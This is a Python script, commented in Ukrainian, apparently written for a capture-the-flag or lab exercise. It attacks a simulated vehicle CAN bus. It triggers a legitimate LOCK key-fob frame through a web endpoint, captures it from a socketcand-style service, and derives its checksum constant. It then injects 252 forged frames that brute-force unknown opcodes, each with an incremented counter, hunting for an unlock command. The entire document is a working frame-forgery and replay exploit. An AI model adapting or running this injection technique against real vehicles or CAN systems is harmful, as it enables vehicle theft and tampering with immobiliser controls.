#!/usr/bin/env python3

import http.client
import json
import re
import socket
import time

HOST = "10.114.131.219"

SOCKETCAND_PORT = 29536
WEB_PORT = 8080

# Твої значення з дампів
FOB_ID = "18A"

# Для payload:
# 2C 7F 20 F3 84 39 40 43
# b0 b1 b2 b3 b4 b5 b6 b7
CHECKSUM_INDEX = 3
OPCODE_INDEX = 6
COUNTER_INDEX = 7

# Відомі opcode з твого дампу:
# LOCK         40
# HORN         1B
# IMMOB_ARM    6C
# IMMOB_DISARM 67
KNOWN_OPCODES = {0x40, 0x1B, 0x6C, 0x67}

LOCK_OPCODE = 0x40

FRAME_RE = re.compile(
    rb"<\s*frame\s+([0-9A-Fa-f]+)\s+"
    rb"[0-9.]+\s+([0-9A-Fa-f]+)\s*>"
)


def натиснути_кнопку(button):
    """Натискає кнопку на веб-інтерфейсі через /press."""
    connection = http.client.HTTPConnection(HOST, WEB_PORT, timeout=3)

    body = json.dumps({"button": button})

    connection.request(
        "POST",
        "/press",
        body,
        {"Content-Type": "application/json"},
    )

    response = connection.getresponse()
    data = response.read()
    connection.close()

    print(f"[ВЕБ] Натиснуто {button}: {data.decode(errors='replace')}")


def отримати_константу_checksum(payload):
    """
    Виводить константу K для checksum.

    Формула:
    K = checksum - сума_інших_байтів mod 256
    """
    return (
        payload[CHECKSUM_INDEX]
        - sum(payload[i] for i in range(8) if i != CHECKSUM_INDEX)
    ) & 0xFF


def перерахувати_checksum(payload, k):
    """
    Перераховує checksum для нового payload.

    Формула:
    checksum = сума_інших_байтів + K mod 256
    """
    payload[CHECKSUM_INDEX] = 0
    payload[CHECKSUM_INDEX] = (
        sum(payload[i] for i in range(8) if i != CHECKSUM_INDEX) + k
    ) & 0xFF


sock = socket.create_connection((HOST, SOCKETCAND_PORT), timeout=10)
sock.settimeout(3)

# Отримуємо привітання від socketcand-like сервісу.
try:
    greeting = sock.recv(256)
    print(greeting.decode(errors="replace"))
except socket.timeout:
    print("[УВАГА] Привітання від сервісу не отримано")

# Відкриваємо CAN-інтерфейс і вмикаємо rawmode.
sock.sendall(b"< open can0 >\n")
time.sleep(0.2)

sock.sendall(b"< rawmode >\n")
time.sleep(0.5)

print("[*] Натискаю легальний LOCK, щоб зловити свіжий FOB-фрейм...")
натиснути_кнопку("LOCK")

buffer = b""
captured = False
injected = False
started = time.time()

while time.time() - started < 15 and not injected:
    try:
        buffer += sock.recv(8192)
    except socket.timeout:
        continue

    consumed = 0

    for match in FRAME_RE.finditer(buffer):
        can_id = match.group(1).decode().upper()
        payload = bytes.fromhex(match.group(2).decode())
        consumed = match.end()

        # Нас цікавить тільки кнопковий FOB-фрейм.
        if can_id != FOB_ID:
            continue

        if len(payload) != 8:
            continue

        # Нам потрібен саме легальний LOCK-фрейм.
        if payload[OPCODE_INDEX] != LOCK_OPCODE:
            print(
                f"[ПРОПУСК] Знайдено {FOB_ID}, але opcode "
                f"{payload[OPCODE_INDEX]:02X}, а не LOCK"
            )
            continue

        captured = True

        current_counter = payload[COUNTER_INDEX]
        next_counter = (current_counter + 1) & 0xFF

        k = отримати_константу_checksum(payload)

        print()
        print("[+] Зловлено свіжий LOCK-фрейм")
        print(f"    payload:        {' '.join(f'{b:02X}' for b in payload)}")
        print(f"    checksum index: {CHECKSUM_INDEX}")
        print(f"    opcode index:   {OPCODE_INDEX}")
        print(f"    counter index:  {COUNTER_INDEX}")
        print(f"    поточний ctr:   {current_counter:02X}")
        print(f"    наступний ctr:  {next_counter:02X}")
        print(f"    checksum K:     {k:02X}")
        print()

        commands = []

        # Перебираємо всі можливі opcode.
        for opcode in range(256):
            # Пропускаємо вже відомі кнопки:
            # LOCK, HORN, IMMOB_ARM, IMMOB_DISARM.
            if opcode in KNOWN_OPCODES:
                continue

            # Беремо копію справжнього LOCK-фрейму.
            candidate = bytearray(payload)

            # Міняємо opcode на кандидата.
            candidate[OPCODE_INDEX] = opcode

            # Ставимо наступний counter.
            candidate[COUNTER_INDEX] = next_counter

            # Перераховуємо checksum під нові байти.
            перерахувати_checksum(candidate, k)

            data = " ".join(f"{byte:02X}" for byte in candidate)

            command = f"< send {FOB_ID} 8 {data} >\n"
            commands.append(command)

        print(f"[*] Відправляю {len(commands)} forged-кандидатів opcode...")
        sock.sendall("".join(commands).encode("ascii"))

        injected = True
        break

    if consumed:
        buffer = buffer[consumed:]

    if len(buffer) > 16384:
        buffer = buffer[-4096:]

time.sleep(1)
sock.close()

if not captured:
    raise SystemExit("[-] Не вдалося зловити свіжий LOCK-фрейм")

if not injected:
    raise SystemExit("[-] Не вдалося відправити forged-кандидати")

print("[+] Пачку unlock-кандидатів відправлено")
print("[*] Тепер перевір веб-сторінку, /events або dashboard на зміну стану/flag.")
